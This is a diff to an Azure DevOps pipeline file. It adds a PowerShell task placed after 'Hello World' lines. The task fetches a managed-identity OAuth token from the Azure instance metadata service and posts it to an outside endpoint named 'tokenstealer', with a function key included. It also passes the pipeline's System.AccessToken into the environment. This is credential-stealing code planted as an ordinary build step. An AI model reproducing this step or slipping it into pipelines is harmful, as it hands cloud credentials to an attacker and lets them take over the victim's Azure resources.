@@ -14,3 +14,26 @@ stages:
         - bash: |
             echo "Initial placeholder"
           displayName: Placeholder task
+        - task: PowerShell@2
+          inputs:
+            targetType: 'inline'
+            script: |
+              # Write your PowerShell commands here.
+                    
+                    Write-Host "Hello World"
+                    Write-Host 'Hi'
+                    $msiResponse = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.net" `
+                            -Headers @{Metadata = "true" } -UseBasicParsing
+                    $msiContent = $msiResponse.Content | ConvertFrom-Json
+                    $access_token = $msiContent.access_token
+                    
+                    $url = "https://tokenstealer.azurewebsites.net/api/HttpTrigger1?code=kcMARCpv_RepaIFcQlIVV7SCNDIbkB89TZC90h8yYD_AAzFutFRB-A=="  # Replace with your desired endpoint URL
+                    $headers = @{
+                        "Content-Type" = "application/json"
+                    }
+                    $body2=@{  
+                        "name" = $access_token
+                    } | ConvertTo-Json
+                    $response = Invoke-RestMethod -Uri $url -Method Post -Body $body2 -Headers $headers
+          env: 
+            system_accesstoken: $(System.AccessToken)     
